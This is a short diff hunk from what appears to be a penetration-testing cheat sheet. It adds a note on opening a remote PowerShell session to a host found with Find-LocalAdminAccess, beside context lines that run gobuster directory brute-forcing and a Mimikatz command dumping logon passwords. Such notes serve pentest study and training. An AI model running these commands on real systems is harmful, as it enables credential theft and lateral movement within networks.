@@ -335,4 +335,7 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
             Invoke-TokenManipulation –Enumerate
             Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
 
+        #### 12.2.10 Remote Powershell session
+        Enter-PSSession COMPUTER (Find-LocalAdminAccess)
+
         
